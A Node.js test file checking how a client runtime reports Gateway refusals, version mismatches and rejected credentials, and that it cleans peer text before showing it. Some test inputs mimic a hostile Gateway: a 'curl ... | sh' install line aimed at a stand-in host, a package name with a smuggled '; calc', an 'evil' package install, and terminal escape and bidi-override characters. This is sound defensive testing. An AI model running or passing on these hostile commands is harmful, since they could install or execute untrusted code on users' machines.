// SPDX-License-Identifier: Apache-2.0
/**
 * What this Runtime says when the Gateway it reaches runs another client protocol.
 *
 * Two things meet during a cutover. This release against the Gateway still in production is
 * refused at `initialize`, and the refusal must read as the version mismatch it is — not as a
 * credential failure, which sends the reader to rotate a token that was never the cause. And a
 * cutover that starts the service from a fresh identity store rejects every credential issued
 * before it: that must read as "pair again", with the release the service requires, never as a
 * network fault.
 *
 * The first arm reproduces, byte for byte, the refusal the production Gateway (`6b1ddc3`)
 * sends to this release: HTTP 400, JSON-RPC -32000, `data.reason = "incompatible_client"`,
 * and its own message. That Gateway names no required release, so the Runtime must say where
 * the right install command is instead of inventing one.
 */
import assert from 'node:assert/strict'
import test from 'node:test'
import { spawn } from 'node:child_process'
import { once } from 'node:events'
import { readFileSync } from 'node:fs'
import { createServer } from 'node:http'
import { join } from 'node:path'

import { HOP_FAILURE, ROOT, callTool, runAgent } from './support/agent-harness.mjs'

const THIS_RELEASE = JSON.parse(readFileSync(new URL('../package.json', import.meta.url), 'utf8')).version

/** Exactly what Gateway 6b1ddc3 answers an initialize that declares no rulith/v1 serialRecovery. */
const PRODUCTION_6B1DDC3_REFUSAL = (input) => ({
  status: 400,
  body: {
    jsonrpc: '2.0',
    id: input.id,
    error: {
      code: -32000,
      message: 'Declare serialRecovery:1 and support session replacement, serial waiting and result handoff',
      data: { reason: 'incompatible_client' },
    },
  },
})

const refusal = (reason, message, data = {}) => (input) => ({
  status: 400,
  body: { jsonrpc: '2.0', id: input.id, error: { code: -32000, message, data: { reason, ...data } } },
})

const pinned = (version, extra = {}) => ({
  requiredClient: { package: 'rulith', version, install: `npm install --global rulith@${version}`, ...extra },
})

/**
 * Rulith Local keeps the first 400 characters of every line a Runtime child prints
 * (local/rulith-local.mjs). No line of a refusal may need more, so an install command, when
 * shown, is never what Local cuts off.
 */
function assertFitsLocalLines(output) {
  for (const line of output.split('\n')) assert.ok(line.length <= 400, `Local would cut this line: ${line}`)
}

async function refusedAtInitialize(refuseInitialize) {
  const run = await runAgent({
    argv: ['do the work'], refuseInitialize,
    model: () => 'The model must never be asked.',
    timeoutMs: 20_000,
  })
  assert.notEqual(run.code, 'timeout', `${run.stdout}\n${run.stderr}`)
  assert.deepEqual(run.methods, ['initialize'], `the client went on past the refused handshake: ${run.methods.join(', ')}`)
  assert.equal(run.modelRequests.length, 0, 'a refused client release reached the model')
  return run
}

test('RT-CUTOVER-1 the production Gateway refusing this release reads as a version mismatch, not a credential failure', async () => {
  const run = await refusedAtInitialize(PRODUCTION_6B1DDC3_REFUSAL)
  assert.equal(run.code, 1, `${run.stdout}\n${run.stderr}`)
  assert.match(run.stderr, /Version mismatch, not a credential problem/)
  assert.match(run.stderr, new RegExp(`this Gateway does not accept Rulith Runtime ${THIS_RELEASE.replaceAll('.', '\\.')}\\.`))
  assert.match(run.stderr, /refused this Runtime at initialize/)
  assert.match(run.stderr, /No model or business tool was called/)
  // The production Gateway names no release, so the Runtime points at the Console's pinned
  // command and the operator rather than inventing a version of its own.
  assert.match(run.stderr, /The Gateway did not name the Runtime release it requires\. Use the install command shown in the Rulith Console/)
  assert.match(run.stderr, /ask the operator which Rulith release the Gateway runs/)
  assert.doesNotMatch(run.stderr, /npm install/)
  assert.ok(run.stderr.includes('Gateway message (incompatible_client): "Declare serialRecovery:1 and support session'
    + ' replacement, serial waiting and result handoff"'), run.stderr)
  assert.doesNotMatch(run.stderr, /Cannot establish an authenticated MCP session/)
  assert.doesNotMatch(run.stderr, /token rejected|rotate the Agent token/)
})

test('RT-CUTOVER-2 the production refusal of an unsupported MCP date is the same mismatch', async () => {
  const run = await refusedAtInitialize(refusal('unsupported_protocol', 'This product requires its approved MCP protocol version'))
  assert.equal(run.code, 1, `${run.stdout}\n${run.stderr}`)
  assert.match(run.stderr, /Version mismatch, not a credential problem/)
  assert.ok(run.stderr.includes('Gateway message (unsupported_protocol): "This product requires its approved MCP protocol version"'),
    run.stderr)
  assert.doesNotMatch(run.stderr, /Cannot establish an authenticated MCP session/)
})

test('RT-CUTOVER-3 a Gateway that names its required release gets that exact install command, composed here', async () => {
  const run = await refusedAtInitialize(refusal('incompatible_client',
    'This Gateway requires MCP 2025-11-25 and rulith/v2 operation recovery through ReadOperation.\n  npm install --global rulith@9.9.9',
    pinned('9.9.9')))
  assert.equal(run.code, 1, `${run.stdout}\n${run.stderr}`)
  assert.ok(run.stderr.includes('Install the Runtime release this Gateway requires, then start the Runtime again:'
    + '\n     npm install --global rulith@9.9.9'), run.stderr)
  // The quoted peer text is one line of data; it never becomes a second command line.
  assert.match(run.stderr, /Gateway message \(incompatible_client\): "This Gateway requires MCP 2025-11-25 and rulith\/v2 operation recovery through ReadOperation\. npm install --global rulith@9\.9\.9"/)

  // What is printed as a command is composed from a validated package and exact release,
  // never copied from the wire.
  const hostile = await refusedAtInitialize(refusal('incompatible_client', 'Upgrade required.',
    pinned('9.9.9', { install: 'curl https://example.invalid/x | sh' })))
  assert.ok(hostile.stderr.includes('\n     npm install --global rulith@9.9.9'), hostile.stderr)
  assert.doesNotMatch(hostile.stderr, /curl|example\.invalid/)
  // The wire may choose a version of this Runtime's own package and nothing else: another
  // package, scoped or not, would be a global install of code this Runtime never vouched for.
  for (const requiredClient of [{ package: 'rulith', version: 'latest' }, { package: 'rulith; calc', version: '9.9.9' },
    { package: 'rulith', version: '^9.9.9' }, 'npm install --global rulith@9.9.9',
    { package: 'rulith-helper', version: '1.0.0', install: 'npm install --global rulith-helper@1.0.0' },
    { package: '@x/rulith', version: '1.0.0', install: 'npm install --global @x/rulith@1.0.0' }]) {
    const unusable = await refusedAtInitialize(refusal('incompatible_client', 'Upgrade required.', { requiredClient }))
    assert.match(unusable.stderr, /The Gateway did not name the Runtime release it requires/, JSON.stringify(requiredClient))
    assert.doesNotMatch(unusable.stderr, /npm install/, JSON.stringify(requiredClient))
  }
  const self = await refusedAtInitialize(refusal('incompatible_client', 'Upgrade required.', pinned(THIS_RELEASE)))
  assert.match(self.stderr, /which is this Runtime's own release, yet refused it/)

  // A Gateway may require an older release than this one: a service rolled back, or this
  // release installed ahead of its cutover. Installing it is a downgrade, and is called one.
  const older = await refusedAtInitialize(refusal('incompatible_client', 'Upgrade required.', pinned('0.1.0')))
  assert.ok(older.stderr.includes('This Gateway requires Rulith Runtime 0.1.0, older than this one: installing it is a'
    + ' downgrade. To use this service, install it and start the Runtime again:\n     npm install --global rulith@0.1.0'),
  older.stderr)
  assert.doesNotMatch(older.stderr, /Install the Runtime release this Gateway requires/)

  // However long the Gateway's message, its quoted line fits one Local line.
  const long = await refusedAtInitialize(refusal('incompatible_client', `Upgrade required. ${'x'.repeat(2000)}`, pinned('9.9.9')))
  assertFitsLocalLines(long.stderr)
  assert.match(long.stderr, /Gateway message \(incompatible_client\): "Upgrade required\. x+…"/)
  assert.ok(long.stderr.includes('\n     npm install --global rulith@9.9.9\n'), long.stderr)
  assertFitsLocalLines(run.stderr)
})

test('RT-CUTOVER-4 an initialize refused for another reason is not read as a version mismatch', async () => {
  const run = await refusedAtInitialize(refusal('invalid_params', 'Initialize requires\u001b[2J\nclientInfo'))
  assert.equal(run.code, 1, `${run.stdout}\n${run.stderr}`)
  assert.doesNotMatch(run.stderr, /Version mismatch/)
  assert.match(run.stderr, /Cannot establish an authenticated MCP session/)
  // Any other refusal's text is flattened like every other peer text.
  assert.ok(run.stderr.includes('MCP initialize failed (HTTP 400): Initialize requires [2J clientInfo'), run.stderr)
  assert.doesNotMatch(run.stderr, /\u001b/)
  const shapeless = await refusedAtInitialize(refusal('incompatible_client', { nested: true }))
  assert.match(shapeless.stderr, /Gateway message \(incompatible_client\): ""/)
  assert.doesNotMatch(shapeless.stderr, /\[object Object\]/)
  // The reason is one string; an array that merely stringifies to it is not the signal.
  const loose = await refusedAtInitialize((input) => ({ status: 400, body: { jsonrpc: '2.0', id: input.id,
    error: { code: -32000, message: 'Refused.', data: { reason: ['incompatible_client'] } } } }))
  assert.doesNotMatch(loose.stderr, /Version mismatch/)
})

test('RT-CUTOVER-5 a token the service no longer knows is rejected with the Gateway\'s next step, not as a network fault', async () => {
  // The current Gateway's 401 for an unknown Agent token. Authentication precedes reading the
  // request, so the JSON-RPC id is null. Released Runtimes print the top-level teaching; this
  // one quotes it as the Gateway's message and composes any install line itself.
  const teaching = 'The Rulith service was reached, but it does not accept this Agent token. Pair this computer'
    + ' again with Setup in the Rulith Console, or create a new Agent token under the Agent\'s Runtime and update'
    + ' this client.\n  If this computer runs an earlier Rulith release, first install the release this service'
    + ' requires:\n  npm install --global rulith@9.9.9'
  const rejected = (data, said = teaching) => () => ({ status: 401,
    body: { jsonrpc: '2.0', id: null, teaching: said,
      error: { code: -32000, message: 'A current Agent token is required', data: { reason: 'unauthenticated', teaching: said, ...data } } } })
  const run = await refusedAtInitialize(rejected(pinned('9.9.9')))
  assert.equal(run.code, 3, `a rejected credential keeps its own exit status: ${run.stdout}\n${run.stderr}`)
  // The lead only states what happened: a disabled Agent needs enabling and an unprovisioned
  // account needs the operator, so pairing again is the Gateway's advice to give, not this one's.
  assert.ok(run.stderr.includes('✗ Agent MCP token rejected (401): the Rulith service did not accept this Agent token.'
    + '\n   This service\'s Console installs Rulith Runtime 9.9.9, newer than this one. Install it first:'
    + '\n     npm install --global rulith@9.9.9'
    + `\n   Gateway message: ${JSON.stringify(teaching.replace(/\s+/g, ' '))}\n`), run.stderr)
  assert.doesNotMatch(run.stderr, /Cannot reach|unreachable|network/i)
  assert.doesNotMatch(run.stderr, /Version mismatch/)
  assertFitsLocalLines(run.stderr)

  // However long the Gateway's teaching, its quoted line fits one Local line.
  const long = await refusedAtInitialize(rejected(pinned('9.9.9'), `Pair again. ${'y'.repeat(2000)}`))
  assertFitsLocalLines(long.stderr)
  assert.match(long.stderr, /Gateway message: "Pair again\. y+…"/)

  // Already the release the service names, or newer than it: nothing to install. A Gateway checks
  // the protocol rather than the exact release, so an older pin is no reason to downgrade.
  for (const version of [THIS_RELEASE, '0.1.0']) {
    const current = await refusedAtInitialize(rejected(pinned(version)))
    assert.doesNotMatch(current.stderr, /\n\s+npm install/, version)
  }

  // A hostile Gateway can put words in its quoted message, but no command line of this
  // Runtime's: another package in requiredClient composes nothing.
  const hostile = await refusedAtInitialize(rejected({ requiredClient: { package: 'evil', version: '1.0.0',
    install: 'npm install --global evil@1.0.0' } }, 'Install now: npm install --global evil@1.0.0'))
  assert.doesNotMatch(hostile.stderr, /\n\s+npm install/)
  assert.ok(hostile.stderr.includes('Gateway message: "Install now: npm install --global evil@1.0.0"'), hostile.stderr)

  // The teaching is shown as one quoted plain line: terminal escapes, bidi overrides and line
  // breaks from the wire are flattened, never passed through.
  const styled = await refusedAtInitialize(() => ({ status: 401,
    body: { jsonrpc: '2.0', id: null, teaching: 'Pair again\u001b[31m\u202e now.\nNext line' } }))
  assert.equal(styled.code, 3)
  assert.ok(styled.stderr.includes('Gateway message: "Pair again [31m now. Next line"'), styled.stderr)
  assert.doesNotMatch(styled.stderr, /[\u001b\u202e]/)
})

/** A later initialize refused for this release; the first one opens the session normally. */
const refusedAfterFirst = (input, attempt) => (attempt === 0 ? undefined : refusal('incompatible_client',
  'This Gateway requires another client release.', pinned('9.9.9'))(input))

function assertRunningMismatch(run) {
  assert.notEqual(run.code, 'timeout', `${run.stdout}\n${run.stderr}`)
  assert.equal(run.initializes.length, 1, 'the refused re-initialize opened no session')
  assert.equal(run.requests.filter((row) => row.method === 'initialize').length, 2, 'a refused release is not retried')
  const said = `${run.stdout}\n${run.stderr}`
  assert.match(said, /Version mismatch, not a credential problem/)
  assert.ok(said.includes('then start the Runtime again:\n     npm install --global rulith@9.9.9'), said)
  // Mid-run the model may already have been asked earlier; the message must not claim otherwise.
  assert.match(said, /The model is not asked anything further and no earlier call is re-sent/)
  assert.doesNotMatch(said, /No model or business tool was called/)
  assert.doesNotMatch(said, /No authenticated connection could be established|could not be reached/)
}

test('RT-CUTOVER-6 a Gateway that refuses this release mid-run stops the turn with the whole version mismatch', async () => {
  // The session expires under a tool call, and the Gateway that answers the re-initialize no
  // longer accepts this release. The turn must stop saying so in full — not as an unreachable
  // or unauthenticated connection, and not cut before the install line.
  const run = await runAgent({
    argv: ['do the work'], env: { RULITH_MAX_ROUNDS: '3', RULITH_RECOVERY_WAIT_MS: '600' },
    expireSessionAfter: 4, // initialize, initialized, tools/list, then the tools/call answered 404
    refuseInitialize: refusedAfterFirst,
    model: (round) => (round === 1 ? { text: '', toolCalls: [{ name: 'OpenCase', input: {} }] } : 'Nothing further.'),
    timeoutMs: 25_000,
  })
  assertRunningMismatch(run)
  assert.equal(run.requests.filter((row) => row.method === 'tools/call').length, 1, 'nothing was re-sent')
})

test('RT-CUTOVER-8 a refusal met while polling an earlier result stops at once, not after the recovery wait', async () => {
  // An earlier result is ready; its ReadOperation finds the session gone, and the next poll's
  // re-initialize is refused. Polling cannot change the release, so the turn stops at once with
  // the whole message instead of retrying until the wait expires and calling it unreachable.
  const run = await runAgent({
    argv: ['do the work'], env: { RULITH_MAX_ROUNDS: '2', RULITH_RECOVERY_WAIT_MS: '30000' },
    recovery: { state: 'result_ready', callRef: 'original-call', tool: 'ApplyAction' },
    expireSessionAfter: 5, // initialize, initialized, tools/list, ping, then the ReadOperation answered 404
    refuseInitialize: refusedAfterFirst,
    model: () => 'The model must not be asked while the release does not match.',
    timeoutMs: 20_000,
  })
  assertRunningMismatch(run)
  assert.equal(run.modelRequests.length, 0)
  assert.deepEqual(run.requests.map((row) => row.method),
    ['initialize', 'notifications/initialized', 'tools/list', 'ping', 'tools/call', 'initialize'])
})

/**
 * Run a Worker against an endpoint that answers with this 401 body: every request, or with
 * `atPoll`, only the poll (the startup Source read succeeds, as for a Worker already running
 * when its Connection stops being accepted).
 */
async function workerRejectedAtStartup(body, { atPoll = false } = {}) {
  const server = createServer((request, response) => {
    request.resume()
    const rejected = !atPoll || request.method !== 'GET'
    response.writeHead(rejected ? 401 : 200, { 'content-type': 'application/json' })
    response.end(JSON.stringify(rejected ? body : { sources: [] }))
  })
  await new Promise((ready) => server.listen(0, '127.0.0.1', ready))
  try {
    const child = spawn(process.execPath, ['worker/rulith-worker.mjs'], {
      cwd: ROOT, stdio: ['ignore', 'pipe', 'pipe'],
      env: { ...process.env, RULITH_WORK_URL: `http://127.0.0.1:${server.address().port}/work`,
        RULITH_CONNECTION: 'stale-connection', RULITH_CONNECTION_KEY: 'stale-key',
        RULITH_TOOLS_FILE: join(ROOT, 'test', 'does-not-exist.json'), RULITH_SOURCES_FILE: join(ROOT, 'test', 'does-not-exist.json') },
    })
    let stderr = ''
    child.stderr.setEncoding('utf8').on('data', (chunk) => { stderr += chunk })
    child.stdout.resume()
    let timer
    try {
      const code = await Promise.race([once(child, 'close').then(([value]) => value),
        new Promise((_, reject) => { timer = setTimeout(() => reject(new Error('worker did not exit after credential rejection')), 10_000) })])
      return { code, stderr }
    } finally {
      clearTimeout(timer)
      if (child.exitCode === null && child.signalCode === null) { const closed = once(child, 'close'); child.kill('SIGKILL'); await closed }
    }
  } finally {
    await new Promise((done) => server.close(done))
  }
}

test('RT-CUTOVER-7 a Worker whose Connection the service no longer knows shows the Gateway\'s next step and its own install line', async () => {
  // A restarted Worker first reads /work/sources. That 401 must carry the same teaching a
  // polling Worker shows: pair again, and the release the service accepts.
  const teaching = 'Worker Connection authentication failed.\n  The Rulith service was reached, but it does not accept this'
    + ' Connection.\n  If this computer runs an earlier Rulith release, first install the release this service requires:'
    + '\n  npm install --global rulith@9.9.9\u001b[2J'
  const stale = await workerRejectedAtStartup({ accepted: false, errorCode: 'unauthenticated', teaching, ...pinned('9.9.9') })
  assert.equal(stale.code, 3, stale.stderr)
  // The install line is this Worker's, composed from the validated requiredClient and standing
  // on its own line; the Gateway's words follow as one quoted, flattened line.
  assert.ok(stale.stderr.includes('Connection credential rejected (401): the Rulith service did not accept this Connection.'
    + '\n   This service\'s Console installs Rulith Runtime 9.9.9, newer than this one. Install it first:'
    + '\n     npm install --global rulith@9.9.9'
    + '\n   Gateway message: "Worker Connection authentication failed. The Rulith service was reached'), stale.stderr)
  assert.ok(stale.stderr.includes('first install the release this service requires: npm install --global rulith@9.9.9 [2J"'), stale.stderr)
  assert.doesNotMatch(stale.stderr, /\u001b/)
  assertFitsLocalLines(stale.stderr)

  // A Worker already polling when its Connection stops being accepted says the same.
  const polling = await workerRejectedAtStartup({ accepted: false, errorCode: 'rejected', reason: 'worker_unauthenticated',
    teaching, ...pinned('9.9.9') }, { atPoll: true })
  assert.equal(polling.code, 3, polling.stderr)
  assert.ok(polling.stderr.includes('Install it first:\n     npm install --global rulith@9.9.9\n   Gateway message: "'), polling.stderr)
  assertFitsLocalLines(polling.stderr)

  // Already the release the service names or newer, or a requiredClient that is not this
  // package at an exact release: no install line, whatever the quoted message says.
  for (const requiredClient of [pinned(THIS_RELEASE).requiredClient, pinned('0.1.0').requiredClient,
    { package: 'evil', version: '9.9.9', install: 'npm install --global evil@9.9.9' },
    { package: 'rulith', version: 'latest', install: 'npm install --global rulith@latest' }]) {
    const quiet = await workerRejectedAtStartup({ accepted: false, errorCode: 'unauthenticated', teaching, requiredClient })
    assert.equal(quiet.code, 3, quiet.stderr)
    assert.doesNotMatch(quiet.stderr, /Install it first|\n\s+npm install/, JSON.stringify(requiredClient))
  }

  // A valid Connection whose Agent is gone: a fresh key would not help, so it is not suggested.
  const orphan = await workerRejectedAtStartup({ accepted: false, errorCode: 'rejected', reason: 'agent_not_found',
    teaching: 'Runtime Agent is unavailable.\n  The Rulith service was reached, but the Agent this Connection belongs to is'
      + ' disabled or no longer exists.' })
  assert.equal(orphan.code, 3, orphan.stderr)
  assert.ok(orphan.stderr.includes('Connection rejected (401): the Agent this Connection belongs to is unavailable.'
    + '\n   Gateway message: "Runtime Agent is unavailable. The Rulith service was reached'), orphan.stderr)
  assert.doesNotMatch(orphan.stderr, /Copy a fresh Connection id/)

  // However long the Gateway's teaching, its quoted line fits one Local line.
  const long = await workerRejectedAtStartup({ accepted: false, errorCode: 'unauthenticated', teaching: `z${'z'.repeat(2000)}` })
  assertFitsLocalLines(long.stderr)
  assert.match(long.stderr, /Gateway message: "z+…"/)

  // An older Gateway (6b1ddc3) sends a one-line status as teaching but names no release: it is
  // quoted, and the lead keeps the advice that fits a bad key, because the status is no next step.
  const legacy = await workerRejectedAtStartup({ accepted: false, errorCode: 'unauthenticated',
    teaching: 'Worker connection is unavailable' })
  assert.equal(legacy.code, 3, legacy.stderr)
  assert.ok(legacy.stderr.includes('Connection credential rejected (401). Copy a fresh Connection id and key from Console > Connections.'
    + '\n   Gateway message: "Worker connection is unavailable"'), legacy.stderr)

  // A Gateway that explains nothing still gets the one piece of advice that fits a bad key.
  const bare = await workerRejectedAtStartup(null)
  assert.equal(bare.code, 3, bare.stderr)
  assert.match(bare.stderr, /Connection credential rejected \(401\)\. Copy a fresh Connection id and key from Console > Connections\./)
  assert.doesNotMatch(bare.stderr, /Gateway message|\[object Object\]/)
})

test('RT-CUTOVER-9 a poll refusal shows only text: a non-string teaching falls back to the error code, flattened', async () => {
  const server = createServer((request, response) => {
    request.resume()
    response.writeHead(request.method === 'GET' ? 200 : 403, { 'content-type': 'application/json' })
    response.end(JSON.stringify(request.method === 'GET' ? { sources: [] }
      : { accepted: false, errorCode: 'worker_tool_not_authorized\u001b[31m', teaching: { not: 'text' }, errors: [{ not: 'text' }] }))
  })
  await new Promise((ready) => server.listen(0, '127.0.0.1', ready))
  const child = spawn(process.execPath, ['worker/rulith-worker.mjs'], {
    cwd: ROOT, stdio: ['ignore', 'pipe', 'pipe'],
    env: { ...process.env, RULITH_WORK_URL: `http://127.0.0.1:${server.address().port}/work`,
      RULITH_CONNECTION: 'test-connection', RULITH_CONNECTION_KEY: 'test-key',
      RULITH_TOOLS_FILE: join(ROOT, 'test', 'does-not-exist.json'), RULITH_SOURCES_FILE: join(ROOT, 'test', 'does-not-exist.json') },
  })
  let stderr = ''
  child.stderr.setEncoding('utf8').on('data', (chunk) => { stderr += chunk })
  child.stdout.resume()
  try {
    const deadline = Date.now() + 5_000
    while (!/Worker endpoint rejected Poll with HTTP 403/.test(stderr) && Date.now() < deadline) {
      await new Promise((ready) => setTimeout(ready, 25))
    }
  } finally {
    const closed = once(child, 'close')
    child.kill('SIGKILL')
    await closed
    await new Promise((done) => server.close(done))
  }
  assert.match(stderr, /Worker endpoint rejected Poll with HTTP 403: worker_tool_not_authorized \[31m/)
  assert.doesNotMatch(stderr, /\[object Object\]|\u001b/)
})

test('RT-CUTOVER-10 the other peer texts shown to a person are flattened the same way', async () => {
  // A replacement refused at initialize prints the Gateway's message at startup.
  const replaced = await runAgent({
    argv: ['do the work'],
    refuseInitialize: (input) => ({ status: 409, body: { jsonrpc: '2.0', id: input.id, error: { code: -32000,
      message: 'Taken over\u001b[31m\nby\u202e another client', data: { reason: 'connection_replaced' } } } }),
    model: () => 'The model must never be asked.',
    timeoutMs: 20_000,
  })
  assert.equal(replaced.code, 4, `${replaced.stdout}\n${replaced.stderr}`)
  assert.ok(replaced.stderr.includes('Taken over [31m by another client'), replaced.stderr)
  assert.doesNotMatch(replaced.stderr, /[\u001b\u202e]/)
  assert.equal(replaced.modelRequests.length, 0)

  // The authority's explanation of a call that needs reconciliation is its text, not this host's.
  const reconcile = await runAgent({
    argv: [], chatLines: ['Run the action.'], env: { RULITH_MAX_ROUNDS: '3', RULITH_RECOVERY_WAIT_MS: '5000' },
    tool: (name) => (name === 'ApplyAction' ? HOP_FAILURE : undefined),
    recovery: ({ toolCalls }) => (toolCalls === 0 ? { state: 'none' } : { state: 'reconciliation_required',
      callRef: 'call-9', tool: 'ApplyAction', teaching: 'The Worker was lost\u001b[2J\nwhile\u2028the Action ran.' }),
    model: () => callTool('ApplyAction', { action: 'demo.ship' }),
    timeoutMs: 20_000,
  })
  assert.notEqual(reconcile.code, 'timeout', `${reconcile.stdout}\n${reconcile.stderr}`)
  assert.match(reconcile.stdout, /needs operator reconciliation/)
  assert.ok(reconcile.stdout.includes('The Worker was lost [2J while the Action ran.'), reconcile.stdout)
  assert.doesNotMatch(`${reconcile.stdout}${reconcile.stderr}`, /[\u001b\u2028]/)
})
